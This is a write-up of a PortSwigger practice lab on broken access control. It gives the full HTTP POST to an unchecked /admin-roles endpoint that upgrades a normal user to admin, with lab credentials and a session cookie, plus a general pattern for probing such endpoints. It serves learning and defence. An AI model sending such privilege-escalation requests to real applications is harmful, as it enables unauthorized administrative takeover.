# Challenge Name: Multi-step process with no access control on one step 
# Platform: PortSwigger
# Difficulty: Practitioner

## 1. Vulnerability Type
Broken Access Control - Vertical Privilege Escalation

## 2. Root Cause
Application does not validate authorization and ownership server-side.

## 3. Attack Surface
`/admin-roles`

## 4. Exploit Method
Inspecting `admin` actions using Burp Suite it is possible to see `/admin-roles` endpoint that upgrades/downgrades users to admin level. To exploit this, after authentication using `wiener:peter`, intercept the request and edit it to the following:
```bash
POST /admin-roles HTTP/1.1
Host: 0aab00430464416980423aa5006d0006.web-security-academy.net
Cookie: session=myvEuE3p2Wq4BE3PHIqq6m7KrGGL2ZRp
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Origin: 0aab00430464416980423aa5006d0006.web-security-academy.net
Referer: 0aab00430464416980423aa5006d0006.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

action=upgrade&confirmed=true&username=wiener
```
This request allows unauthorized user to access admin privilege action and upgrade himself to admin. The application uses a multi-step process for role change. The final step /admin-roles does not check if the user is admin,
so the request can be sent directly by a normal user.

## 5. Payload / Technique
Request modification.

## 6. Impact
Unauthorized access to admin actions. This can lead to data loss, financial loss, full administrative control over application.

## 7. Reusable Pattern
No server-side verification or ownership check -> try possible endpoints that require authorization.

## 8. Key Takeaway
Always validate actions using proper server-side authorization and ownership.


